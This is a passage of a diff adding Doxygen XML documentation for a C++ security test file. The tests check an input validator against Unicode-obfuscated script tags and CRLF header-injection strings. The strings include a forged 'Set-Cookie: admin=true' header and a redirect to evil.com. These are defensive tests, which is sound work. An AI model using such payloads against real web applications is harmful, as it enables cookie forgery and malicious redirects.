+<codeline lineno="272"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>unicode_attacks<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="273"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;\xEF\xBC\x9Cscript\xEF\xBC\x9E&quot;</highlight><highlight class="normal">,<sp/><sp/></highlight><highlight class="comment">//<sp/>Full-width<sp/>characters</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="274"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;\u003Cscript\u003E&quot;</highlight><highlight class="normal">,<sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Unicode<sp/>escapes</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="275"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;\x3Cscript\x3E&quot;</highlight><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Hex<sp/>escapes</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="276"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="277"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="278"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>attack<sp/>:<sp/>unicode_attacks)<sp/>{</highlight></codeline>
+<codeline lineno="279"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>std::string<sp/>normalized<sp/>=<sp/>validator_-&gt;normalizeUnicode(attack);</highlight></codeline>
+<codeline lineno="280"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="281"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>After<sp/>normalization,<sp/>script<sp/>tags<sp/>should<sp/>be<sp/>detectable</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="282"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(normalized.find(</highlight><highlight class="stringliteral">&quot;&lt;script&quot;</highlight><highlight class="normal">)<sp/>!=<sp/>std::string::npos<sp/>||</highlight></codeline>
+<codeline lineno="283"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>normalized.find(</highlight><highlight class="stringliteral">&quot;&amp;lt;script&quot;</highlight><highlight class="normal">)<sp/>!=<sp/>std::string::npos)</highlight></codeline>
+<codeline lineno="284"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Unicode<sp/>normalization<sp/>should<sp/>reveal<sp/>hidden<sp/>patterns&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="285"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="286"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="287"><highlight class="normal"></highlight></codeline>
+<codeline lineno="291"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>CRLFInjection_HTTPHeaderSplitting)<sp/>{</highlight></codeline>
+<codeline lineno="292"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>crlf_injections<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="293"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;test\r\nSet-Cookie:<sp/>admin=true&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="294"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;value\nLocation:<sp/>http://evil.com&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="295"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;test%0d%0aSet-Cookie:<sp/>hacked=true&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="296"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="297"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="298"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>injection<sp/>:<sp/>crlf_injections)<sp/>{</highlight></codeline>
+<codeline lineno="299"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateHeaderValue(injection);</highlight></codeline>
+<codeline lineno="300"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="301"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;CRLF<sp/>injection<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>injection;</highlight></codeline>
+<codeline lineno="302"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="303"><highlight class="normal">}</highlight></codeline>
+    </programlisting>
+    <location file="tests/security/test_input_validation_security.cpp"/>
+  </compounddef>
+</doxygen>
